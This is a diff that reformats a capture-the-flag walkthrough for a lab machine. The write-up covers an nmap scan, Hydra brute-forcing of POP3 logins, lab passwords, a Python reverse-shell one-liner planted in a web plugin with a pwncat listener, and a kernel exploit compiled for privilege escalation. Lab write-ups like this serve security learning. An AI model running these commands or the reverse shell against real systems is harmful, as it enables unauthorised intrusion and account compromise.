@@ -8,7 +8,7 @@
 
 I began by scanning the target machine using `nmap` to identify open ports:
 
-nmap -n -v -sT -p- -T5 IP
+`nmap -n -v -sT -p- -T5 <IP>`
 
 
 
@@ -52,7 +52,9 @@ This successfully found the password:
 
 I then logged in via telnet:
 
-telnet <IP> 55007 user boris pass secret1!
+`telnet <IP> 55007`
+user: boris 
+pass: secret1!
 
 
 
@@ -63,21 +65,20 @@ After logging in, I listed and retrieved the emails using `retr <email num>`, re
 
 Using Hydra again, I cracked Xenia’s password:
 
-hydra -l Xenia -P <path_to_password_list> <IP> -s 55007 pop3
-
-vbnet
+`hydra -l Xenia -P <path_to_password_list> <IP> -s 55007 pop3`
 
 
-The password was **bird**. After logging into her account, I found her new password: **RCP90rulez**.
+
+The password was **bird**. After logging into her account, I found her new password: **RCP90rulez!**.
 
 ### **2.4 Accessing the Website**
 
 This led me to the next hint regarding the **severnaya-station.com** website. I added it to my `/etc/hosts` file to access it:
 
-nano /etc/hosts
+`nano /etc/hosts`
 
 Add the line
-<IP> severnaya-station.com
+`<IP> severnaya-station.com`
 
 
 
@@ -91,7 +92,7 @@ user: Xenia pass: RCP90rulez!
 
 Under **"My Profile,"** I found a message from **Dr. Doak** revealing his creds:
 
-hydra -l Doak -P <path_to_wordlist> <IP> -s 55007 pop3
+`hydra -l Doak -P <path_to_wordlist> <IP> -s 55007 pop3`
 
 
 
@@ -115,7 +116,8 @@ eFdpbnRlckE50TV4IQ==
 
 Decoded, it revealed: **xWinter1995x!**
 
-user: admin pass: xWinter1995x!
+user: admin 
+pass: xWinter1995x!
 
 
 
@@ -128,14 +130,14 @@ user: admin pass: xWinter1995x!
 
 I created a **reverse shell** using Python:
 
-python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>", <Port>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh"])'
+` python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>", <Port>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh"])' `
 
 
 
 
 I inserted this script into the spell check plugin on the website, then started a listener using `pwncat`:
 
-pwncat --listen -p 9999
+`pwncat --listen -p 9999`
 
 
 
@@ -146,7 +148,11 @@ This granted me a shell on the system. The kernel version was **3.13.0-32-generi
 
 I compiled and executed the exploit:
 
-upload exploit.c /tmp cd /tmp cc exploit.c -o exploit ./exploit
+upload exploit.c /tmp 
+cd /tmp 
+cc exploit.c -o exploit 
+run the exploit
+./exploit
 
 
 
